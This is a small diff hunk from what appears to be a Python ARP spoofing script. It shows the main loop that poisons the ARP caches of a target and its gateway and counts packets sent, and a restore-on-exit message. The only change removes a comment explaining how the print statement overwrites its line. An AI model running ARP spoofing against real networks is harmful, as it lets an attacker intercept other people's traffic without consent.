@@ -46,7 +46,7 @@ try:
         spoof(target_ip, gateway_ip, target_mac)
         spoof(gateway_ip, target_ip, gateway_mac)
         count += 2
-        print("\r[+] Sent {0} Packets".format(str(count)),end=" ")  # end=" " and \r is to clear all that is written in the line and print over it, the \r means to start from the beggining of the line and the end option allows us to store the print statement in a buffer all in one line and do not have a new line
+        print("\r[+] Sent {0} Packets".format(str(count)),end=" ")  
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n\n[+] Quiting and Resetting ARP tables.....")
